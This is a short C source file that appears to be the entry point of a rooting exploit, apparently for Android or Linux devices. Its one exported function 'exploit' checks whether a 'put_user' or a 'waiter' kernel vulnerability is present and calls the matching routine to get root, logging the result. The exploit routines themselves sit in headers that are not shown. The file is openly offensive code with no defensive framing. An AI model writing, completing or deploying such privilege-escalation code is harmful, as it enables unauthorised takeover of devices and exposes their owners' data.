#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "lib_put_user.h"
#include "waiter_exploit.h"
#include "log.h"
#include "remote_main_lib.h"

// Should be the only exported symbol
__attribute__ ((visibility ("default"))) int exploit(void) {

  if(put_user_check_exploitability()) {
    LOGD("[CHECK] Put_user exploit available\n");
    return put_user_get_root(NULL, NULL);
  }
  else if(waiter_exploit_check_exploitability()) {
    LOGD("[CHECK] Waiter exploit available\n");
    return waiter_exploit_get_root(NULL, NULL);
  }
  else {
    LOGD("[CHECK] Device doesn't appear to be vulnerable.... giving up!!\n");
  }

  return 0;

}
